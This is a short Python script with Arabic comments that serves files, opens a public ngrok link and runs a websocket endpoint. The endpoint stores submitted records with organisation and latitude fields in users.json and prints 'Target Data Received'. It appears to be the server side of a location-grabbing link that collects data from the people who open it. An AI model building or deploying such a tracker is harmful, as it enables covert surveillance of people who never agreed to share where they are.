import asyncio
import json
import time
import threading
from http.server import HTTPServer , SimpleHTTPRequestHandler
import websockets
from pyngrok import ngrok # تأكد من تثبيتها عبر pip install pyngrok

USER_FILE = "users.json"
HTTP_PORT = 8000
WS_PORT = 8765

def load_users():
    try:
        with open(USER_FILE,'r',encoding='utf-8') as f:
            return json.load(f)
    except:
        return []

def save_user(user):
    users = load_users()
    for u in users:
        if u["org"] == user["org"] and u["lat"] == user["lat"]:
            return
    users.append(user)
    with open(USER_FILE,'w',encoding='utf-8') as f :
        json.dump(users,f,indent=2)

async def ws_handler(ws):
    data = await ws.recv()
    user = json.loads(data)
    user["time"] = time.strftime("%Y-%m-%d %H:%M:%S")
    save_user(user)
    print('OK - Target Data Received!')

async def start_ws():
    async with websockets.serve(ws_handler,"0.0.0.0",WS_PORT):
        await asyncio.Future()

def start_http():
    server = HTTPServer(("0.0.0.0", HTTP_PORT),SimpleHTTPRequestHandler)
    server.serve_forever()

if __name__ == "__main__":
    # --- كود الـ Webview والرابط التلقائي ---
    print("[*] Generating Public WebView Link...")
    public_url = ngrok.connect(HTTP_PORT).public_url
    ws_url = public_url.replace("http", "ws")
    
    # حفظ الرابط لكي يستخدمه العميل تلقائياً
    with open("config.js", "w") as f:
        f.write(f'const SERVER_LINK = "{ws_url}";')

    print("\n" + "="*50)
    print(f"🔗 Your WebView Link: {public_url}")
    print("="*50 + "\n")

    threading.Thread(target=start_http,daemon=True).start()
    asyncio.run(start_ws())
